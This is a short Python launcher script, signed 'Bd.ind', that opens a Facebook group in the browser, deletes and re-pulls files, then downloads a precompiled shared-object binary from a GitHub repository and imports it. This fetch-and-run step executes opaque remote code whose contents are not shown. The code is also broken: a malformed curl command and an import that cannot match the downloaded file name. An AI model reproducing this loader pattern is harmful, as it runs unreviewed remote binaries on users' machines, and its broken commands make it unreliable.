
#<\>!python3.11
#<\>coded by Bd.ind
#----------------Don't Copy This Script--------------#
import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')
os.system('xdg-open https://facebook.com/groups/770617227293870/')
import requests
try:
    if sys.argv[1]=='update':
        os.system('rm -rf Bd.ind.so')
except:
    pass
os.system('rm -rf Bd.ind.so')
os.system('git pull')

bit = platform.architecture()[0]
if bit == '64bit':
    if not os.path.isfile('Bd.ind.so'):
        os.system('curl -L git clone https://github.com/Rajesh108765/executables/blob/main/Bd.ind.cpython-311.so?raw=true -o Bd.ind.so') 
        import Bd.ind
        #Bd.ind.RM()
    else:
        import Bd.ind
        #Bd.ind.RM()
elif bit == '32bit':
    exit('\033[1;31m\n Sorry System or 32bit device not supported ')
    
    
